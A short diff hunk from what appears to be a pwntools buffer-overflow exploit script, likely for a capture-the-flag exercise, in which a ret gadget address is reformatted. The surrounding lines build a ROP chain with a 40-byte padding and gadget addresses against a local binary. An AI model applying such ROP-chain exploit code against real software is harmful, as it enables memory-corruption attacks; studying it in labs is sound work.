@@ -10,7 +10,7 @@ context.binary = BINARY
 p = process(BINARY)
 
 pop_rdi_rsi_rdx_ret = 0x40093c
-ret = 0x00000000004006be
+ret = 0x4006be
 
 rop = b"A" * 40
 rop += p64(ret)
